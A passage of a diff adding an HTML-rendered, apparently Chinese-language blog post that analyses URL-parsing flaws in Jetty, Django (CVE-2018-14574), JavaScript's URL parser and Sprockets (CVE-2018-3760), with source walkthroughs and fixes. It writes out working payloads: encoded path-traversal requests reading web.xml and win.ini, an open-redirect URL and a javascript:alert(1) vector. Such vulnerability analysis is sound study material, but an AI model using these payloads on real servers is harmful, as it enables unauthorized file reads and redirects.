+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">state&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpURI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">State&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">QUERY&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;F&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;f&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">escapedSlash&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">_ambiguous&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpURI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Ambiguous&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SEPARATOR&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">escapedSlash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">escapedSlash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当出现%2f或者%2F时，就会直接设置&lt;code>_ambiguous&lt;/code>增加一个&lt;code>SEPARATOR&lt;/code>代表含有编码的分隔符，当出现&lt;code>/;?#&lt;/code>，都会进入&lt;code>checkSegment&lt;/code>函数&lt;/p>
+&lt;p>它会取这个&lt;code>/&lt;/code>前一个段的值，并在&lt;code>__ambiguousSegments&lt;/code>中寻找是否存在，如果存在就在&lt;code>_ambiguous&lt;/code>增加&lt;code>SEGMENT&lt;/code>，如果不存在，并且含有param，就在&lt;code>_ambiguous&lt;/code>增加&lt;code>PARAM&lt;/code>&lt;/p>
+&lt;p>而这个预设的&lt;code>__ambiguousSegment&lt;/code>中没有&lt;code>%u002e&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>payload2&lt;/li>
+&lt;/ul>
+&lt;p>问题在canonicalPath函数，在规范化的过程中，特意考虑了&lt;code>\u0000&lt;/code>，当出现空字符时，如果空字符前只有1个点或者超过2个点的时候，直接break，将空字符忽略直接丢掉&lt;/p>
+&lt;p>所以在最后校验时用的是&lt;code>/.\u0000/WEB-INF/web.xml&lt;/code>，获取资源时再次canonicalPath，将空字符丢弃，读取web.xml&lt;/p>
+&lt;ul>
+&lt;li>payload3&lt;/li>
+&lt;/ul>
+&lt;p>canonical在解析&lt;code>/a/b/..\u0000&lt;/code>时，canonical=&lt;code>/a/b/&lt;/code>，解析到空字符时，会先将长度减1，也就是丢掉最后一个&lt;code>/&lt;/code>，变为&lt;code>/a/b&lt;/code>，然后找到最后的分隔符，并截取到最后一个空字符，也就是最终变为&lt;code>/a/&lt;/code>，不仅忽略了空字符，也完成了&lt;code>../&lt;/code>的规范化，可是之后并没有将dot设为0&lt;/p>
+&lt;p>解析完空字符，就解析&lt;code>/&lt;/code>，那么此时dots还是等于2，会再进行一次&lt;code>../&lt;/code>的规范化操作，这就导致一次&lt;code>..\u0000&lt;/code>，解析成了&lt;code>../../&lt;/code>的作用&lt;/p>
+&lt;h4 id="修复">修复&lt;/h4>
+&lt;p>先解码在规范化，不让有歧义的url进入后面的校验过程；并且特殊注意空字符，直接拒绝就完事了&lt;/p>
+&lt;ol>
+&lt;li>输入path=&lt;code>/HelloTomcat/%u002e/WEB-INF/web.xml&lt;/code>&lt;/li>
+&lt;li>URL解码&lt;code>decodePath(path)&lt;/code> ==&amp;gt; path=&lt;code>/HelloTomcat/./WEB-INF/web.xml&lt;/code>&lt;/li>
+&lt;li>规范化&lt;code>canonicalPath(path)&lt;/code> ==&amp;gt; path= &lt;code>/HelloTomcat/WEB-INF/web.xml&lt;/code>&lt;/li>
+&lt;li>取target=&lt;code>/WEB-INF/web.xml&lt;/code>&lt;/li>
+&lt;li>安全校验&lt;code>isProtectTarget(target)&lt;/code> ==&amp;gt; target= &lt;code>/WEB-INF/web.xml&lt;/code>，是以&lt;code>/web-inf&lt;/code>或&lt;code>/web-meta&lt;/code>开头，无法通过校验，返回404&lt;/li>
+&lt;/ol>
+&lt;h2 id="python">Python&lt;/h2>
+&lt;h3 id="djangocve-2018-14574">Django/CVE-2018-14574&lt;/h3>
+&lt;p>Django &amp;lt; 2.0.8&lt;/p>
+&lt;h4 id="分析-1">分析&lt;/h4>
+&lt;p>如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中&lt;/p>
+&lt;p>如果我们访问hxxp://example.com//baidu.com，则会在末尾加上斜杠//baidu.com/，而&lt;code>//&lt;/code>告诉浏览器这是绝对路径，而且前面scheme为空，直接绕过对scheme的检查，跳转到//baidu.com/&lt;/p>
+&lt;h4 id="修复-1">修复&lt;/h4>
+&lt;p>如果url以&lt;code>//&lt;/code>开头，对第二个&lt;code>/&lt;/code>进行urlencode，如果上面的payload访问，实际为&lt;code>/%2fbaidu.com&lt;/code>，就不是绝对路径了&lt;/p>
+&lt;h2 id="javascript">Javascript&lt;/h2>
+&lt;ul>
+&lt;li>new URL(&amp;ldquo;http://xxx/javascript:alert(1)&amp;rdquo;).pathname&lt;/li>
+&lt;/ul>
+&lt;p>结果为&lt;code>/javascript:alert(1)&lt;/code>，多余的&lt;code>/&lt;/code>会坏事&lt;/p>
+&lt;p>查找whatwg的规范，如果url的cannot-be-a-base-URL为true，那么pathname=path[0]，示例：&lt;/p>
+&lt;ul>
+&lt;li>new URL(&amp;ldquo;non:javascript:alert(1)&amp;rdquo;).pathname&lt;/li>
+&lt;/ul>
+&lt;p>解析为javascript:alert(1)，可以弹窗，任意协议都可，同理：&lt;/p>
+&lt;ul>
+&lt;li>new URL(&amp;ldquo;url:hxxp://example.com&amp;rdquo;)&lt;/li>
+&lt;/ul>
+&lt;p>如果对URL进行检测，可以单纯的加上&lt;code>url:&lt;/code>前缀，不影响解析&lt;/p>
+&lt;h2 id="ruby">Ruby&lt;/h2>
+&lt;h3 id="sprocketscve-2018-3760">Sprockets/CVE-2018-3760&lt;/h3>
+&lt;p>Sprockets是用来检查js文件间的依赖关系的，以此优化网页中引入的js文件，以避免加载不必要的js文件&lt;/p>
+&lt;p>当访问&lt;code>http://127.0.0.1:3000/assets/foo.js&lt;/code>时会进入server.rb&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">start_time&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">Time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">now&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">to_f&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">time_elapsed&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lambda&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">Time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">now&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">to_f&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">start_time&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">to_i&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">![&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;HEAD&amp;#39;&lt;/span>&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#111">include?&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method_not_allowed_response&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Served asset &lt;/span>&lt;span style="color:#d88200">#{&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;PATH_INFO&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> -&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Extract the path from everything after the leading slash&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">Rack&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#00a8c8">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">unescape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;PATH_INFO&amp;#39;&lt;/span>&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#111">to_s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/^\//&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Strip fingerprint&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">fingerprint&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">path_fingerprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&lt;/span>&lt;span style="color:#d88200">#{&lt;/span>&lt;span style="color:#111">fingerprint&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 此时path值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># URLs containing a `&amp;#34;..&amp;#34;` are rejected for security reasons.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">forbidden_request?&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">forbidden_response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">asset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">find_asset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">options&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>forbidden_request&lt;/code>用来对path进行检查，是否包含&lt;code>..&lt;/code>以防止路径穿越，是否是绝对路径：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">forbidden_request?&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Prevent access to files elsewhere on the file system&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># http://example.org/assets/../../../etc/passwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">include?&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;..&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">absolute_path?&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果请求中包含&lt;code>..&lt;/code>即返回真，然后返回forbidden_response(env)信息，比如&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /assets/file:%2f%2f/IC:/chybeta/blog/vendorlassets/javascripts/../chybeta
+&lt;/code>&lt;/pre>&lt;p>回到最初的call函数，进入&lt;code>find_asset(path, options)&lt;/code>，在 lib/ruby/gems/2.4.0/gems/sprockets-3.7.1/lib/sprockets/base.rb:63&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Find asset by logical path or expanded path.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_asset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{})&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">options&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">compat&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">uri&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 解析出来的 uri 值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>跟进&lt;code>load&lt;/code>，在 lib/ruby/gems/2.4.0/gems/sprockets-3.7.1/lib/sprockets/loader.rb:32 。以请求&lt;code>GET /assets/file:%2f%2f//C:/chybeta/blog/app/assets/config/%252e%252e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2fWindows/win.ini&lt;/code>为例，其一步步的解析过程见下注释：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 此时 uri 已经经过了一次的url解码&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 其值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">unloaded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">UnloadedAsset&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">key?&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">:id&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">asset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">fetch_asset_from_dependency_cache&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">do&lt;/span> &lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">paths&lt;/span>&lt;span style="color:#f92672">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># When asset is previously generated, its &amp;#34;dependencies&amp;#34; are stored in the cache.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># The presence of `paths` indicates dependencies were stored.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># We can check to see if the dependencies have not changed by &amp;#34;resolving&amp;#34; them and&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># generating a digest key from the resolved entries. If this digest key has not&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># changed the asset will be pulled from cache.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># If this `paths` is present but the cache returns nothing then `fetch_asset_from_dependency_cache`&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># will confusingly be called again with `paths` set to nil where the asset will be&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># loaded from disk.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 当存在缓存时&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">paths&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">load_from_unloaded&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">digest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">DigestUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digest&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resolve_dependencies&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">paths&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">uri_from_cache&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digest_key&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">digest&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">asset_from_cache&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">UnloadedAsset&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri_from_cache&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">asset_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 当缓存不存在，主要考虑这个&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">load_from_unloaded&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">Asset&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">asset&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>跟入&lt;code>UnloadedAsset.new&lt;/code>&lt;/p>
